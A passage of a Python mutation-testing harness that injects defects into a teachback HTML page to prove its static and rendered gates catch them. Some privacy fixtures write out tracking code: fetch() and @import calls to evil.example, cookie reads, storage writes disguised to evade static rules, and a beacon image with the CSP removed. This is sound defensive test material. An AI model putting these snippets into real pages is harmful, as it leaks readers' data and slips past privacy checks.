            r'(<div class="chips keychips">)[\s\S]*?(\n</div>)',
            r"\1\2",
            h,
            count=1,
        ),
    ),
    (
        "privacy: reach storage through document.defaultView",
        "computed global access",
        lambda h: h.replace(
            'var ANNOT_KEY = "teachback:annotations";',
            'var ANNOT_KEY = "teachback:annotations";\n'
            '  document.defaultView.localStorage.setItem("teachback:responses", "x");',
            1,
        ),
    ),
    # The batch below came from auditing which checks NO mutation exercised. 56 of 71 had none, and
    # every vacuous check found in the Eon-Labs/alpha-forge#527 review so far had been in that set —
    # so that is where the remaining ones were. Six of the seven probes below turned up a real defect.
    (
        "notation: remove ONE of two chips sharing a role, leaving the role covered",
        "carries reading",
        drop_one_same_role_symbol_chip,
    ),
    (
        "notation: move the key BELOW the first equation, respelling one attribute",
        "notation key precedes",
        move_key_after_first_equation,
    ),
    (
        "terminology: delete the clipboard composer, leaving the ledger's prose mention",
        "--terms instruction",
        lambda h: re.sub(r'return "/teachback --update " \+ page \+ " --terms[^;]*;', 'return "";', h, count=1),
    ),
    (
        "mathjax: empty the LaTeX panel, keeping its 'LaTeX source' label",
        "recoverable LaTeX",
        empty_one_latex_panel,
    ),
    (
        "privacy: read the cookie jar through bracket notation",
        "no cookies or session storage",
        lambda h: h.replace(
            'var ANNOT_KEY = "teachback:annotations";',
            'var ANNOT_KEY = "teachback:annotations";\n  var jar = document["cookie"];',
            1,
        ),
    ),
    (
        "notation: delete ONE role's CSS rule, leaving it named in prose",
        "every role used has a CSS rule",
        drop_one_role_css,
    ),
    (
        "notation: strip every \\underbrace from the equations, leaving one in a comment",
        "multi-term groups are named",
        lambda h: h.replace("\\underbrace{", "\\mathord{", 1_000) + "\n<!-- \\underbrace{x}_{y} -->\n",
    ),
    # The hard-wrap invariant is the skill's release blocker and had FOUR checks and no mutation. Its
    # own documentation warns that the obvious regex for it is unsatisfiable, which is precisely the
    # signature of a check worth exercising.
    ("layout: hard-wrap one paragraph", "no <p> element contains a newline", break_one_paragraph),
    (
        "layout: break a paragraph with <br> instead of a newline",
        "no <br> or <wbr> inside any <p>",
        lambda h: replace_in_first_paragraph(h, ". ", ".<br> "),
    ),
    (
        "layout: break a paragraph with a newline ENTITY",
        "no newline entities inside any <p>",
        lambda h: replace_in_first_paragraph(h, ". ", ".&#10; "),
    ),
    (
        "layout: pin text open with white-space:nowrap",
        "white-space:nowrap not used",
        lambda h: h.replace(
            ".eq,.reads,.numbers{overflow-x:auto}", ".eq,.reads,.numbers{overflow-x:auto;white-space:nowrap}", 1
        ),
    ),
    (
        "privacy: drop default-src, leaving the named allowances",
        "CSP denies everything by default",
        lambda h: h.replace("default-src 'none'; ", "", 1),
    ),
    (
        "privacy: allow form submission",
        "CSP forbids form submission",
        lambda h: h.replace("form-action 'none'; ", "", 1),
    ),
    (
        "privacy: unpin the base URI",
        "CSP pins a base URI",
        lambda h: h.replace("; base-uri 'none'", "", 1),
    ),
    (
        "assessment: strip one option's feedback",
        "every option carries feedback",
        lambda h: swap_assessment(h, lambda d: d["questions"][0]["options"][0].__setitem__("fb", "")),
    ),
    (
        "assessment: offer a forbidden 'all of the above' option",
        "no forbidden option text",
        lambda h: swap_assessment(h, lambda d: d["questions"][0]["options"][1].__setitem__("t", "All of the above.")),
    ),
    (
        "assessment: drop one question's stated objective",
        "every question states an objective",
        lambda h: swap_assessment(h, lambda d: d["questions"][0].__setitem__("objective", "")),
    ),
    (
        "mathjax: renumber an equation, breaking contiguity",
        "equation identifiers are stable and contiguous",
        lambda h: h.replace('<span class="eqid">(5)</span>', '<span class="eqid">(9)</span>', 1),
    ),
    (
        "notation: give one symbol a second role",
        "no symbol carries two different roles",
        lambda h: h.replace("\\class{sym-ret}{\\mathbf{R}}", "\\class{sym-cost}{\\mathbf{R}}", 1),
    ),
    (
        "notation: hide the key from the expert switch",
        "notation key survives the expert switch",
        lambda h: h.replace("body.no-annot .keychips{display:flex}", "body.no-annot .keychips{display:none}", 1),
    ),
    (
        "notation: strip the colour encoding from the prose",
        "the encoding extends into prose",
        strip_prose_encoding,
    ),
    (
        "mathjax: drop the html extension from the loader",
        "html extension is in the loader",
        lambda h: h.replace("loader: { load: ['[tex]/html'] }", "loader: { load: [] }", 1),
    ),
    (
        "accessibility: point an in-page anchor at a missing id",
        "every in-page anchor resolves",
        lambda h: h.replace('href="#assess"', 'href="#assess-typo"', 1),
    ),
    (
        "structure: remove the doctype",
        "doctype first",
        lambda h: h.replace("<!DOCTYPE html>", "<!-- doctype removed -->", 1),
    ),
    (
        "structure: remove the lang attribute",
        "lang attribute",
        lambda h: h.replace('<html lang="en">', "<html>", 1),
    ),
    (
        "structure: remove the viewport meta tag",
        "viewport meta",
        lambda h: h.replace('<meta name="viewport" content="width=device-width, initial-scale=1">', "", 1),
    ),
    (
        "structure: add a second h1",
        "exactly one <h1>",
        lambda h: h.replace("<h1>", "<h1>Duplicate</h1>\n<h1>", 1),
    ),
    (
        "structure: remove the main landmark",
        # The label is built as f"<{name}> landmark", so it reconstructs to "<{}> landmark" and a
        # concrete "<main> landmark" never matches it. Match the literal fragment instead.
        "landmark",
        lambda h: h.replace("<main ", "<div ", 1).replace("</main>", "</div>", 1),
    ),
    (
        "structure: remove the skip link",
        "skip link",
        lambda h: h.replace('<a class="skip" href="#main">Skip to content</a>', "", 1),
    ),
    (
        "structure: remove the noscript fallback",
        "noscript fallback",
        lambda h: h.replace(
            "<noscript><p><strong>JavaScript is disabled.</strong> The questions above require JavaScript for interactive validation. All explanatory content in sections 1 through 11 is present in the page and fully readable without it.</p></noscript>",
            "",
            1,
        ),
    ),
    (
        "toggle: remove the annotation toggle element",
        "annotation toggle present",
        remove_annotation_toggle,
    ),
    (
        "toggle: remove aria-pressed attribute",
        "toggle exposes pressed state",
        remove_aria_pressed,
    ),
    (
        "assessment: remove the assessment-data script tag",
        "assessment is a parseable JSON data block",
        remove_assessment_script,
    ),
    (
        "assessment: corrupt the JSON to make parsing fail",
        "assessment JSON parses",
        corrupt_assessment_json,
    ),
    (
        "assessment: make assessment content an empty string",
        "assessment JSON parses",
        make_assessment_empty_string,
    ),
    (
        "assessment: add a 9th question to exceed the 8-question limit",
        "3-8 questions",
        exceed_question_count,
    ),
    (
        "a11y: replace focus-visible with focus-not-visible in selector",
        "visible focus styles",
        lambda h: h.replace(
            "a:focus-visible,button:focus-visible,summary:focus-visible,input:focus-visible",
            "a:focus-not-visible,button:focus-not-visible,summary:focus-not-visible,input:focus-not-visible",
            1,
        ),
    ),
    (
        "a11y: remove the dark keyword from all prefers-color-scheme checks",
        "dark mode",
        lambda h: h.replace("prefers-color-scheme: dark", "prefers-color-scheme: only-light"),
    ),
    (
        "a11y: remove print media query",
        "print styles",
        lambda h: h.replace("@media print", "@media projection", 1),
    ),
    (
        "a11y: introduce skipped heading level (h2 → h4)",
        "no skipped heading levels",
        lambda h: re.sub(r"<h2\b", "<h4", h, count=1),
    ),
    (
        "layout: remove overflow-x:auto from eq/reads/numbers",
        "can scroll their maths locally",
        lambda h: h.replace(".eq,.reads,.numbers{overflow-x:auto}", ".eq,.reads,.numbers{overflow:hidden}", 1),
    ),
    (
        "privacy: add a remote stylesheet via @import",
        "no stylesheet fetches a remote resource",
        lambda h: h.replace(
            "</head>",
            '\n<style>@import url("https://evil.example/style.css");</style>\n</head>',
            1,
        ),
    ),
    (
        "privacy: insert a fetch() call in a script block",
        "no scripted network transmission",
        lambda h: h.replace(
            '<script type="application/json"',
            '<script>fetch("https://evil.example/beacon");</script>\n  <script type="application/json"',
            1,
        ),
    ),
    (
        "privacy: add an unguarded localStorage access outside try/catch",
        "every localStorage access sits inside its own try/catch",
        lambda h: h.replace(
            'var ANNOT_KEY = "teachback:annotations";',
            'var ANNOT_KEY = "teachback:annotations";\nlocalStorage.setItem(ANNOT_KEY, "unguarded");',
            1,
        ),
    ),
    (
        "privacy: inject google-analytics string into the page",
        "no analytics",
        lambda h: h.replace("</body>", "  <!-- google-analytics marker -->\n</body>", 1),
    ),
    (
        "terminology: delete the terminology request form",
        "terminology request form present",
        lambda h: re.sub(r'<div[^>]*id="termRequest"[^>]*>.*?</div>\n?', "", h, flags=re.S, count=1),
    ),
    (
        "revision: delete the revision ledger table",
        "revision ledger present",
        lambda h: re.sub(r'<table[^>]*id="ledger"[^>]*>.*?</table>\n?', "", h, flags=re.S, count=1),
    ),
    (
        "revision: remove all revision rows from the ledger",
        "ledger has at least one revision row",
        lambda h: re.sub(r"<tr\s+data-revision[^>]*>.*?</tr>\n?", "", h, flags=re.S),
    ),
    (
        "revision: change the latest revision id to not match the computed hash",
        "latest declared revision id matches the computed hash of <main>",
        lambda h: _change_latest_revision_id(h),
    ),
    (
        "mathjax: change version-pinned URL to unpinned",
        "the MathJax source is version-pinned",
        change_mathjax_version_format,
    ),
    (
        "mathjax: add an equation image to the page",
        "no equation images",
        add_equation_image,
    ),
    (
        "mathjax: remove the html package from the packages list",
        "html package enabled",
        remove_html_package_enabled,
    ),
    (
        "notation: reduce role vocabulary to fewer than 3",
        "a systematic role vocabulary is in use",
        reduce_role_vocabulary,
    ),
    (
        "notation: remove dark-scheme CSS for one role",
        "every role has a dark-scheme value",
        remove_dark_scheme_values,
    ),
    (
        "assessment: duplicate feedback strings across questions",
        "all feedback is unique",
        lambda h: swap_assessment(h, duplicate_feedback_strings),
    ),
    (
        "assessment: remove distractor exploration tracking",
        "distractor exploration is tracked",
        lambda h: h.replace("explored", "click_tracked"),
    ),
    (
        "assessment: remove per-question reset label",
        "per-question reset",
        lambda h: h.replace("Reset this question", "Clear this question"),
    ),
    (
        "assessment: remove reset-all element",
        "reset all",
        lambda h: re.sub(
            r'<button[^>]*id="resetAll"[^>]*>Reset all questions</button>', "<!-- reset button removed -->", h, count=1
        ),
    ),
    (
        "assessment: remove aria-live attribute from summary",
        "live summary region",
        strip_aria_live,
    ),
]

# Mutations whose defect is BEHAVIOURAL: no source pattern distinguishes them, so only the rendered
# gate can catch them. Run with --rendered.
BEHAVIOURAL_MUTATIONS: list[Mutation] = [
    # The page still renders, nothing is disabled, and .fb stays non-empty — it simply keeps showing
    # the correct answer's message. A check that only asserts "feedback is non-empty" passes.
    (
        "assessment: silently ignore distractor clicks once solved",
        "distractor shows ITS OWN",
        lambda h: h.replace("    if (s.solved) {", "    if (s.solved) { if (!o.ok) { return; }", 1),
    ),
    # Storage reached by a spelling the STATIC gate does not know about. `Reflect.get` is neither a
    # bracket-built key nor a named Window alias, so the syntactic rules miss it entirely — and that
    # is the point: the rendered gate reads what was actually stored, so the spelling is irrelevant.
    (
        "privacy: persist a second key via Reflect.get, invisible to the static rules",
        "localStorage holds exactly",
        lambda h: h.replace(
            '  applyAnnot(savedAnnot !== "off");',
            '  Reflect.get(document, "defaultView").localStorage.setItem("teachback:responses", "x");\n'
            '  applyAnnot(savedAnnot !== "off");',
            1,
        ),
    ),
    # A persistence surface the storage checks never enumerated. No localStorage, no sessionStorage,
    # no cookie — and the reader's state is on disk all the same.
    (
        "privacy: persist reader state in IndexedDB",
        "IndexedDB database",
        lambda h: h.replace(
            '  applyAnnot(savedAnnot !== "off");',
            '  (function () { var r = indexedDB.open("teachback_db", 1);\n'
            '    r.onupgradeneeded = function (e) { e.target.result.createObjectStore("readers", { keyPath: "k" }); };\n'
            "    r.onsuccess = function (e) { var db = e.target.result;\n"
            '      db.transaction("readers", "readwrite").objectStore("readers").put({ k: "state", v: savedAnnot }); }; })();\n'
            '  applyAnnot(savedAnnot !== "off");',
            1,
        ),
    ),
    # The \\class{sym-*} wrappers stay in the source, so every static colour check still passes —
    # but the reader sees undifferentiated black. A source scan cannot see this at all.
    (
        "notation: neutralise the symbol colours in CSS, leaving the markup intact",
        "visibly colour-coded",
        lambda h: h.replace(
            "</style>",
            'mjx-container [class*="sym-"]{color:inherit !important}\n</style>',
            1,
        ),
    ),
    # ONE role, not all of them. Neutralising every role trips "distinct colours" on its own; this
    # leaves five roles vividly coloured and exactly one rendered as ordinary body text, which a
    # check asking whether ALL of them match the body colour cannot see.
    (
        "notation: neutralise ONE role's colour, leaving the others vivid",
        "differs from the body text colour",
        lambda h: h.replace(
            "</style>",
            "mjx-container .sym-cost{color:var(--fg) !important}\n</style>",
            1,
        ),
    ),
    # Scoped to a NON-FIRST DISTRACTOR: the previous "last question" mutation moved along the
    # question dimension but still broke EVERY false option, so it could not expose a gate that
    # clicks only distractor index 0. This breaks the LAST distractor of each question and nothing
    # else, which is invisible to any first-distractor-only check.
    (
        "assessment: ignore only the LAST distractor of each question",
        "distractor shows ITS OWN",
        lambda h: h.replace(
            "    if (s.solved) {",
            "    if (s.solved) { if (!o.ok && oi === q.options.length - 1) { return; }",
            1,
        ),
    ),
    # The reviewer's exact scenario: two distractors whose feedback agrees for 60 characters, and a
    # handler that shows the FIRST distractor's explanation whichever one is clicked. A 60-character
    # prefix comparison cannot tell them apart; full-string containment can.
    (
        "assessment: show a sibling distractor's feedback, sharing a 60-char prefix",
        "distractor shows ITS OWN",
        lambda h: swap_assessment(h, share_distractor_prefix).replace(
            'fb.textContent = "What this option assumes — " + o.fb;',
            # Show the NEXT distractor's feedback, cyclically. Always a different string from last
            # time, so "the text changed" still holds; always the WRONG option's explanation, so
            # full-string matching catches it while the 60-character prefix cannot.
            "var _ds = q.options.filter(function (x) { return x.ok === false; });\n"
            "        var _p = _ds.indexOf(o);\n"
            "        var _shown = _p >= 0 ? _ds[(_p + 1) % _ds.length] : o;\n"
            '        fb.textContent = "What this option assumes — " + _shown.fb;',
            1,
        ),
    ),
    # The permitted write becomes dead code. Nothing forbidden is stored — nothing is stored at all —
    # so a subset check ("no key other than the allowed one") is satisfied by an EMPTY set.
    (
        "privacy: make the allowed localStorage write a no-op",
        "localStorage holds exactly",
        lambda h: h.replace(
            'localStorage.setItem(ANNOT_KEY, on ? "on" : "off");',
            'void (on ? "on" : "off");',
            1,
        ),
    ),
    # Scoped to a NON-FIRST question on purpose: a gate that samples question zero certifies this.
    (
        "assessment: ignore distractors only in the LAST question",
        "distractor shows ITS OWN",
        lambda h: h.replace(
            "    if (s.solved) {",
            "    if (s.solved) { if (!o.ok && q.id === QUESTIONS[QUESTIONS.length - 1].id) { return; }",
            1,
        ),
    ),
    # The rendered gate was the thinner half of the audit — 5 of 24 call sites exercised — and a blind
    # RENDERED check is the worst kind, because no amount of reading the source can reveal it. These
    # override through an appended <style> or <script> rather than editing the page's own rules, so
    # they keep testing the check rather than a particular spelling of the page.
    (
        "rendering: remove the MathJax loader, so nothing typesets",
        "MathJax typeset the page",
        lambda h: re.sub(r'<script id="mj"[\s\S]*?</script>', "", h, count=1),
    ),
    (
        "rendering: raise a JavaScript error on load",
        "no JavaScript console errors",
        lambda h: append_to_body(h, "<script>thisFunctionDoesNotExist();</script>"),
    ),
    (
        "privacy: fetch an image from a third-party origin at runtime",
        "no request to an origin outside the allowlist",
        lambda h: append_to_body(
            h.replace('<meta http-equiv="Content-Security-Policy"', '<meta name="was-csp"', 1),
            '<img alt="" src="https://example.org/beacon.png">',
        ),
    ),
    (
        "notation: give one role a second colour in one equation only",
        "each role renders in ONE colour everywhere",
        lambda h: append_to_body(
            h, "<style>div.eq:first-of-type mjx-container .sym-out{color:#010203!important}</style>"
        ),
    ),
    (
        "notation: collapse two roles onto the same colour",
        "every role resolves to a distinct colour",
        lambda h: append_to_body(
            h,
            "<style>.sym-cost,mjx-container .sym-cost,.sym-disp,mjx-container .sym-disp{color:#3366aa!important}</style>",
        ),
    ),
    ("notation: make the dark palette identical to the light one", "different palettes", force_identical_palettes),
    (
        "layout: constrain the shell to a narrow column",
        "shell occupies",
        lambda h: append_to_body(h, "<style>.shell{max-width:600px!important}</style>"),
    ),
    (
        "layout: cap body text at a measure narrower than the column",
        "body text fills the content column",
        lambda h: append_to_body(h, "<style>main p{max-width:40ch!important}</style>"),
    ),
    (
        "layout: introduce horizontal overflow with an over-wide block",
        "no horizontal overflow",
        lambda h: append_to_body(h, '<div style="width:3000px;height:1px"></div>'),
    ),
    (
        "expertise: make the toggle stop hiding the readings",
        "annotation toggle hides the readings",
        lambda h: append_to_body(h, "<style>body.no-annot .reads{display:block!important}</style>"),
    ),
    (
        "expertise: hide the notation key by a route the static rule does not inspect",
        "the notation key survives the toggle",
        lambda h: append_to_body(h, "<style>body.no-annot .keychips .chip{display:none!important}</style>"),
    ),
    (
        "privacy: write to sessionStorage at runtime",
        "nothing was written to sessionStorage or cookies",
        lambda h: append_to_body(h, '<script>sessionStorage.setItem("teachback:probe", "1");</script>'),
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "layout: make .shell a grid and let its children auto-flow",
        "every grid child has an explicit grid-column",
        make_shell_a_grid_with_unplaced_children,
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "notation: hide colours when annotation toggle is off",
        "colour survives the toggle",
        break_color_toggle,
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "interaction: remove the annotation toggle button",
        "annotation toggle present",
        hide_annotation_toggle,
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "assessment: rename the assessment data id so the gate cannot find it",
        "assessment data readable for the lock-out check",
        rename_assessment_data_id,
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "interaction: disable all options after solving",
        "after solving, no option is disabled in ANY of",
        disable_all_options_after_solve,
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "assessment: strand a declared option by removing its rendered input",
        "every question's options were reachable",
        strand_one_declared_option,
    ),
    # NOT verified by its author — harness is the arbiter
    (
        "privacy: annotation state not persisted across reload",
        "the annotation choice survives a reload in both directions",
        break_annotation_persistence,
    ),
]


def audit_coverage() -> int:
    """Report which gate checks NO mutation exercises. Returns the number unexercised.

    This exists because the reverse audit paid immediately. `expects` proves each MUTATION hits a
    check; it says nothing about checks no mutation touches, and a check that has never been observed
    to fail is not a check. When this was first run, 56 of 71 static checks had no mutation — and
    every vacuous check found in review up to that point had been in that set. Probing seven of them
    turned up six real defects, including an ordering check that passed for any ordering.

    The remaining count is printed rather than hidden: a partial suite that reports itself as partial
    is honest; one that reports "all mutations killed" is not.
    """
    targets = {expects for _, expects, _ in (*MUTATIONS, *BEHAVIOURAL_MUTATIONS)}
    total = unexercised = 0
    for gate in (GATE, RENDERED_GATE):
        sites = discover_checks(gate.read_text())
        missing = [s for s in sites if s.label is None or not any(t in s.label for t in targets)]
        total += len(sites)
        unexercised += len(missing)
        print(f"\n=== {gate.name}: {len(sites) - len(missing)}/{len(sites)} check call sites exercised ===")
        for s in missing:
            shown = s.label if s.label is not None else f"<label not statically known: {s.expression}>"
            print(f"    NO MUTATION  line {s.line}: {shown}")
    print(f"\n{total - unexercised}/{total} check call sites exercised; {unexercised} never observed to fail.")
    return unexercised


class CheckSite(NamedTuple):
    """One `.check(...)` call site, located structurally rather than by pattern."""

    line: int
    label: str | None  # None when the label cannot be known without running the gate
    expression: str


def discover_checks(source: str) -> list[CheckSite]:
    """Find every `.check(...)` call by PARSING, not by matching text.

    The first version scanned for `.check("` with a regex, which accepted only a literal
    double-quoted first argument. Nine call sites build their label with an f-string — the per-scheme
    colour checks, the landmark checks, the viewport and post-solve assertions — and every one of
    them was absent from the numerator, the denominator AND the "NO MUTATION" list. Two of the nine
    were in fact exercised by behavioural mutations.

    So the audit built to find silently-omitted checks was itself silently omitting checks, and
    reported a smaller, tidier total than the truth: 88 where there are 98. Reported by review; the
    fix is to stop pattern-matching source code and parse it.

    An f-string label is reconstructed from its literal parts with `{}` standing in for each
    interpolation, which is enough for substring matching. A label that cannot be reconstructed at
    all is returned as None and counted as UNEXERCISED — unknown must not read as satisfied.
    """
    sites: list[CheckSite] = []
    for node in ast.walk(ast.parse(source)):
        if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "check"):
            continue
        first = node.args[0] if node.args else None
        sites.append(CheckSite(node.lineno, static_label(first), ast.unparse(first) if first else "<no args>"))
    return sorted(sites, key=lambda s: s.line)


def static_label(node: ast.expr | None) -> str | None:
    """The part of a check's label knowable without executing it, or None."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.JoinedStr):
        parts = [v.value if isinstance(v, ast.Constant) and isinstance(v.value, str) else "{}" for v in node.values]
        joined = "".join(parts)
        return joined if joined.strip("{}") else None
    return None


def apply_and_classify(
    mutation: Mutation,
    original: str,
    work: pathlib.Path,
    baseline: int,
    gate: pathlib.Path | None = None,
    extra: list[str] | None = None,
) -> int:
    """Run one mutation and report it. Returns 1 if the targeted check remains UNPROVEN, else 0.

    Four outcomes, three of which leave the check unproven:

    BROKEN      the mutation could not find its target, or changed nothing — it tests nothing.
    SURVIVED    the gate stayed green on a defective page — the gate is blind.
    MISDIRECTED the gate went red, but not on the check this mutation targets. The usual cause is a
                mutation that is a no-op for its own purpose while incidentally disturbing something
                global (the revision id, a count). Counting this as a kill is how a blind check
                acquires a passing mutation.
    KILLED      the targeted check reported the failure. Only this is evidence.
    """
    label, expects, fn = mutation
    try:
        mutated = fn(original)
    except AssertionError as exc:
        print(f"  BROKEN MUTATION  {label} — {exc}")
        return 1
    if mutated == original:
        print(f"  BROKEN MUTATION  {label} — changed nothing")
        return 1
    work.write_text(mutated)
    n, fails = run(work, gate, extra)
    if n <= baseline:
        print(f"  SURVIVED {label}  <-- GATE IS BLIND")
        return 1
    on_target = [f for f in fails if expects in f]
    if not on_target:
        print(f"  MISDIRECTED {label}  <-- red, but NOT on {expects!r}; that check is still unproven")
        for f in fails:
            print(f"      actual: {f}")
        return 1
    print(f"  KILLED   {label}  ({n} failure(s), on target: {expects!r})")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Mutation fixtures for the teachback static gate.")
    # Optional so --audit-coverage, which reads only the gates, need not be handed a page it ignores.
    ap.add_argument("page", type=pathlib.Path, nargs="?")
    ap.add_argument(
        "--rendered",
        action="store_true",
        help="also run BEHAVIOURAL mutations against verify_rendered.py (needs a browser)",
    )
    ap.add_argument("--browser", default=None, help="Chromium path passed to the rendered gate")
    ap.add_argument(
        "--audit-coverage",
        action="store_true",
        help="list gate checks that no mutation exercises, and exit",
    )
    args = ap.parse_args()
    if args.audit_coverage:
        audit_coverage()
        return 0
    if args.page is None:
        ap.error("a page is required unless --audit-coverage is given")
    original = args.page.read_text()
    work = args.page.with_suffix(".mutant.html")
    work.write_text(original)
    base_n, base_fails = run(work)
    print(f"BASELINE unmutated failures: {base_n} (0 expected)")
    if base_n != 0:
        print("ABORT: baseline is not clean; every kill below would be uninterpretable.")
        for f in base_fails:
            print("   ", f)
        return 1

    unproven = 0
    print("--- mutations ---")
    for mutation in MUTATIONS:
        unproven += apply_and_classify(mutation, original, work, base_n)

    if args.rendered:
        # Some defects leave no source signature at all. A handler that silently ignores distractor
        # clicks once a question is solved renders identically, disables nothing, and leaves the
        # feedback element non-empty — only driving the page can tell.
        extra = ["--browser", args.browser] if args.browser else []
        print("\n--- behavioural mutations (rendered gate) ---")
        work.write_text(original)
        base_r, base_r_fails = run(work, RENDERED_GATE, extra)
        print(f"BASELINE rendered failures: {base_r} (0 expected)")
        if base_r != 0:
            print("ABORT: rendered baseline is not clean; every kill below would be uninterpretable.")
            for f in base_r_fails:
                print("   ", f)
            return 1
        for mutation in BEHAVIOURAL_MUTATIONS:
            unproven += apply_and_classify(mutation, original, work, base_r, RENDERED_GATE, extra)

    work.unlink(missing_ok=True)
    total = len(MUTATIONS) + (len(BEHAVIOURAL_MUTATIONS) if args.rendered else 0)
    print(f"\n{total - unproven}/{total} mutations killed BY THE CHECK THEY TARGET")
    return 0 if unproven == 0 else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except HarnessError as exc:
        # Loud and distinct from "a mutation survived": the harness did not run, so NO conclusion
        # about the gate can be drawn from this invocation.
        print(f"\nHARNESS ERROR — no conclusion can be drawn from this run.\n{exc}")
        sys.exit(2)
